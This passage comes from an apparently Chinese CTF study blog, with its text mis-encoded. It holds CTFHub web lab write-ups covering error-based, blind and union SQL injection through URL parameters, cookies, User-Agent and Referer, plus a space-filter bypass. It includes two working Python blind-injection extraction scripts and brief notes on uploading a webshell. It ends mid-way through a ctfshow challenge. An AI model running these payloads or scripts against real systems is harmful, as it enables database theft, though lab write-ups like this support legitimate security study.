<h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>å…ˆorder byæ‰¾ä¸€ä¸‹åˆ—æ•°</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308091711580.png" alt="image-20230308091711580"></p>
<p>æŠ¥é”™æ³¨å…¥å¯ä»¥ç”¨<code>updatexml(1,2,3)</code>å‡½æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°å«ç‰¹æ®Šç¬¦å·æ—¶æŠ¥é”™ï¼ŒåŒæ—¶å°†ç¬¬äºŒä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯é‡Œ</p>
<p>ç‰¹æ®Šç¬¦å·ç”¨0x7e -&gt; ~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database()),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092106795.png" alt="image-20230308092106795"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;)),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092458129.png" alt="image-20230308092458129"></p>
<p>å¾—åˆ°sqliåº“ä¸­ä¸¤ä¸ªè¡¨ï¼šflagï¼Œnews</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select * from sqli.flag)),3)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092916770.png" alt="image-20230308092916770"></p>
<p>æ­¤æ—¶ä»…æ˜¾ç¤ºäº†å‰ä¸€éƒ¨åˆ†çš„flagï¼ŒåŸå› æ˜¯updatexmlå‡½æ•°æœ€å¤šåªèƒ½æ˜¾ç¤º32ä½å­—ç¬¦çš„é•¿åº¦ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select * from sqli.flag),20,32)),3)</span><br></pre></td></tr></table></figure>

<p>æŸ¥åˆ°äº†ç¬¬20-32ä½çš„flag</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308093231337.png" alt="image-20230308093231337"></p>
<p>æ‹¼èµ·æ¥å°±å¾—åˆ°äº†å®Œæ•´flag</p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>å…³é”®ç‚¹æ˜¯ifåˆ¤æ–­ï¼š	</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºtrueï¼Œåˆ™æ‰§è¡Œexpr2è¯­å¥ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºfalseï¼Œåˆ™æ‰§è¡Œexpr3è¯­å¥ã€‚</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨substrå‡½æ•°ï¼Œæˆªå–å­—ç¬¦ä¸²ï¼ˆåº“åã€è¡¨åã€æ•°æ®ï¼‰å¹¶æ”¾å…¥expr1ä¸­è¿›è¡Œåˆ¤æ–­ï¼Œä»è€Œå¾—å‡ºæ­£ç¡®å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(substr(database(),1,1)=&#x27;s&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083311747.png" alt="image-20230309083311747"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083339235.png" alt="image-20230309083339235"></p>
<p>æ˜¾ç„¶ï¼Œæ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºs</p>
<p>æœ‰pythonè„šæœ¬éå†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;è¾“å…¥url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#æŸ¥åº“å</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#æ•°æ®åº“åé™åˆ¶ä¸º64å­—ç¬¦ï¼Œä½†ä¸€èˆ¬å°äº9ï¼Œä¸ºäº†æ•ˆç‡</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linuxä¸‹mysqlåº”è¯¥æ˜¯å¯¹å¤§å°å†™æ•æ„Ÿçš„ï¼Œè€Œwindowsåˆ™ä¸</span></span><br><span class="line">			url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">			r = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">				database_name = database_name+i</span><br><span class="line">				<span class="built_in">print</span>(database_name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#æŸ¥è¡¨å</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#çœ‹å‰å››ä¸ªè¡¨</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#ä¸€èˆ¬æ¥è¯´è¡¨çš„æœ€å¤§é•¿åº¦æœ‰64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#æŸ¥åˆ—</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#åˆ¤æ–­åˆ—é‡Œæœ€å¤šæœ‰4ä¸ªå­—æ®µ</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#åˆ¤æ–­ä¸€ä¸ªå­—æ®µåæœ€å¤šæœ‰9ä¸ªå­—ç¬¦ç»„æˆ</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#åˆ¤æ–­ä¸€ä¸ªå€¼æœ€å¤šæœ‰51ä¸ªå­—ç¬¦ç»„æˆ</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126å¯¹åº”çš„æ•°å­—+è‹±æ–‡+&#123;,&#125;,|</span></span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309093514036.png" alt="image-20230309093514036"></p>
<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>æ–¹æ³•å’Œå¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œåˆ©ç”¨ifåˆ¤æ–­ï¼Œä½†éœ€è¦å¼•å…¥sleep()å‡½æ•°ï¼Œä»æ˜¯å¦æ‰§è¡Œsleep()å‡½æ•°æ¥åˆ¤æ–­ifæ¡ä»¶æ˜¯å¦æˆç«‹</p>
<p>ä¾‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(length(database())&gt;=2,sleep(1),1)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ•°æ®åº“åå­—å¤§äºç­‰äºäºŒï¼Œåˆ™è¿”å›æ—¶é—´åº”è¯¥å¤§äº1</p>
<p>è„šæœ¬ä¸å¸ƒå°”ç›²æ³¨çš„è„šæœ¬ç±»ä¼¼ï¼Œåªä¸è¿‡éœ€è¦å¼•å…¥timeåº“</p>
<p>ç”±äºç½‘ç»œç¯å¢ƒçš„æ³¢åŠ¨ï¼Œä¸€èˆ¬è¦è·‘ä¸‰æ¬¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;è¾“å…¥url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#æŸ¥åº“å</span></span><br><span class="line">    <span class="keyword">global</span> database_name</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#æ•°æ®åº“åé™åˆ¶ä¸º64å­—ç¬¦ï¼Œä½†ä¸€èˆ¬å°äº9ï¼Œä¸ºäº†æ•ˆç‡</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linuxä¸‹mysqlåº”è¯¥æ˜¯å¯¹å¤§å°å†™æ•æ„Ÿçš„ï¼Œè€Œwindowsåˆ™ä¸</span></span><br><span class="line">            url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                database_name = database_name+i</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#æŸ¥è¡¨å</span></span><br><span class="line">    <span class="keyword">global</span> table_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#çœ‹å‰å››ä¸ªè¡¨</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#ä¸€èˆ¬æ¥è¯´è¡¨çš„æœ€å¤§é•¿åº¦æœ‰64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#æŸ¥åˆ—</span></span><br><span class="line">    <span class="keyword">global</span> column_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#åˆ¤æ–­åˆ—é‡Œæœ€å¤šæœ‰4ä¸ªå­—æ®µ</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#åˆ¤æ–­ä¸€ä¸ªå­—æ®µåæœ€å¤šæœ‰9ä¸ªå­—ç¬¦ç»„æˆ</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#åˆ¤æ–­ä¸€ä¸ªå€¼æœ€å¤šæœ‰51ä¸ªå­—ç¬¦ç»„æˆ</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126å¯¹åº”çš„æ•°å­—+è‹±æ–‡+&#123;,&#125;,|</span></span><br><span class="line">            url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ç”¨sqlmapå§ï¼Œå¤Ÿæ²¡è„‘å­çš„</p>
<h2 id="MySQLç»“æ„"><a href="#MySQLç»“æ„" class="headerlink" title="MySQLç»“æ„"></a>MySQLç»“æ„</h2><p>æœ¬è´¨å°±æ˜¯æ•´æ•°å‹æ³¨å…¥</p>
<p>ç”¨<code>1 and 1=1</code>åˆ¤æ–­å‡ºï¼Œç„¶åunion select è”åˆæ³¨å…¥å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095151777.png" alt="image-20230310095151777"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;fddqhlosgo&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095210033.png" alt="image-20230310095210033"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,umremmalnq from sqli.fddqhlosgo</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095301878.png" alt="image-20230310095301878"></p>
<h2 id="Cookieæ³¨å…¥"><a href="#Cookieæ³¨å…¥" class="headerlink" title="Cookieæ³¨å…¥"></a>Cookieæ³¨å…¥</h2><p>æç¤ºæ˜¯cookieæ³¨å…¥ï¼Œéšä¾¿å‘ç‚¹cookieè¿‡å»</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262211721.png" alt="image-202303262211721"></p>
<p>é‚£å°±å‘cookie idè¿‡å»</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262214650.png" alt="image-20230326221312259"></p>
<p>æ˜¾ç„¶æ˜¯æ™®é€šçš„æ•°å­—æ³¨å…¥ï¼Œorder byå°è¯•ä¹‹åæœ‰ä¸¤åˆ—</p>
<p>é‚£å°±ç”¨ä¸€èˆ¬çš„è”åˆæ³¨å…¥union select</p>
<p>æ„é€ id&#x3D;-1 union select 1,codeæŸ¥æ‰¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262216303.png" alt="image-20230326221603268"></p>
<p>å·²ç»æˆåŠŸæ³¨å…¥äº†ï¼Œçœ‹å¾—å‡ºæ¥æ•°æ®åº“æ˜¯sqli</p>
<p>çˆ†åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217257.png" alt="image-20230326221717225"></p>
<p>çˆ†è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217179.png" alt="image-20230326221754150"></p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;gpdznzrugt&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262218763.png" alt="image-20230326221827733"></p>
<p>çˆ†å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,rgbrnkhfep from sqli.gpdznzrugt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262219457.png" alt="image-20230326221914424"></p>
<h2 id="UAæ³¨å…¥"><a href="#UAæ³¨å…¥" class="headerlink" title="UAæ³¨å…¥"></a>UAæ³¨å…¥</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082200993.png" alt="image-20230508220028924"></p>
<p>ç”¨hackbaré‡æ–°å‘ä¸€éè¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select database(),1#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082203345.png" alt="image-20230508220334316"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;nnzwsnydwo&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select pekzosqxfm,1 from sqli.nnzwsnydwo#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082210184.png" alt="image-20230508221053144"></p>
<h2 id="Referæ³¨å…¥"><a href="#Referæ³¨å…¥" class="headerlink" title="Referæ³¨å…¥"></a>Referæ³¨å…¥</h2><p>åŒUA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;uakovlxjab&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select hkjndazhbu,1 from sqli.uakovlxjab#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082216660.png" alt="image-20230508221601615"></p>
<h2 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h2><p>å¸¸è§çš„æœ‰&#x2F;**&#x2F;,(),%0a</p>
<p>ç»å°è¯•å¯ä»¥ç”¨&#x2F;**&#x2F;ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database(),1#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name),1/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name),1/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;vihvhlsoyv&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/kfqwbuiugf,1/**/from/**/sqli.vihvhlsoyv#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082229910.png" alt="image-20230508222955876"></p>
<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="æ— éªŒè¯"><a href="#æ— éªŒè¯" class="headerlink" title="æ— éªŒè¯"></a>æ— éªŒè¯</h2><p>ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103421787.png" alt="image-20230228103421787"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103436838.png" alt="image-20230228103436838"></p>
<h2 id="å‰ç«¯éªŒè¯"><a href="#å‰ç«¯éªŒè¯" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h2><p>ç¦ç”¨jsä¹‹åä¸€å¥è¯ğŸ´</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_èŒæ–°</title>
    <url>/2023/09/28/ctfshow_%E8%90%8C%E6%96%B0/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # åˆ¤æ–­idçš„å€¼æ˜¯å¦å¤§äº999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id å¤§äº 999 ç›´æ¥é€€å‡ºå¹¶è¿”å›é”™è¯¯</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id å°äº 999 æ‹¼æ¥sqlè¯­å¥</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;æ‰§è¡Œçš„sqlä¸ºï¼š$sql&lt;br&gt;&quot;;</span><br><span class="line">        # æ‰§è¡Œsql è¯­å¥</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # åˆ¤æ–­æœ‰æ²¡æœ‰æŸ¥è¯¢ç»“æœ</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # å¦‚æœæœ‰ç»“æœï¼Œè·å–ç»“æœå¯¹è±¡çš„å€¼$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # å…³é—­æ•°æ®åº“è¿æ¥</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>ç›®æ ‡å°±æ˜¯è®©intval($id) &lt;&#x3D; 999çš„åŒæ—¶$id&#x3D;1000</p>
